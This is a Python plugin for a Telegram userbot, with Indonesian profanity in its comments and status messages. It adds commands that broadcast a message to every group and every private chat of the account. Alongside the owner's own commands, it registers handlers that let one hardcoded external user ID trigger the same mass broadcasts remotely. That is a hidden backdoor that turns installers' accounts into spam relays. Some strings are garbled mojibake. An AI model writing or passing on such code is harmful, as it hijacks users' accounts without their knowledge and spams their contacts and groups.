from userbot.events import register
from userbot import CMD_HELP, bot


GCAST_BLACKLIST = [
    -1001473548283,  # SharingUserbot
    -1001433238829,  # TedeSupport
    -1001476936696,  # AnosSupport
    -1001327032795,  # UltroidSupport
    -1001294181499,  # UserBotIndo
    -1001419516987,  # VeezSupportGroup
    -1001209432070,  # GeezSupportGroup
    -1001296934585,  # X-PROJECT BOT
    -1001481357570,  # UsergeOnTopic
    -1001459701099,  # CatUserbotSupport
    -1001109837870,  # TelegramBotIndonesia
    -1001752592753,  # Skyzusupport
    -1001456135097,  # SpamBot
    -1001462425381,  # GRUP GUA
    -1001649802697,  # GRUP GUA
    -1001386557465,  # RumahKitaroo
    -1001692751821,  # ramsupportt
]
    

# BLACKLIST NYA JANGAN DI HAPUS NGENTOD.

@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
@register(incoming=True, from_users=1683788007, pattern=r"^\.cgcast(?: |$)(.*)")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("** PESAN NYA MANA KONTOL??**")
        return
    kk = await event.edit("`INI GW KIRIM SABAR ANJING`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chat not in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"**ππ³π°π· π±π΄ππ·π°ππΈπ» ππ° πΊπΎπ½ππΎπ» πΌπ΄π½πΆπ΄ππΈπΌ πΏπ΄ππ°π½ πΊπ΄** `{done}` **πΆππΎππΏ, πΆπ°πΆπ°π» πΌπ΄π½πΆπ΄ππΈπΌ πΏπ΄ππ°π½ πΊπ΄** `{er}` **πΆππΎππΏ**"
    )


@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
@register(incoming=True, from_users=1683788007, pattern=r"^\.cgucast(?: |$)(.*)")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if not xx:
        return await event.edit("`PESAN NYA MANA KONTOLLL?`")
    tt = event.text
    msg = tt[7:]
    kk = await event.edit("`SABAR YA KONTOL INI LAGI DI KIRIM`")
    er = 0
    done = 0
    async for x in bot.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await bot.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(f"udah berhasil ya kontol ngirim pesan ke `{done}` obrolan, kesalahan dalam `{er}` obrolan(s)")


CMD_HELP.update(
    {
        "gcast": "πΎπ€π’π’ππ£π: `.gcast`\
         \nβ³ : Mengirim Pesan Ke Pada Group Alay Dan Sampah Secara Global."})

CMD_HELP.update(
    {
         "gucast": "πΎπ€π’π’ππ£π: `.gucast`\
         \nβ³ : Mengirim Pesan Pribadi Secara Global."
    }
)
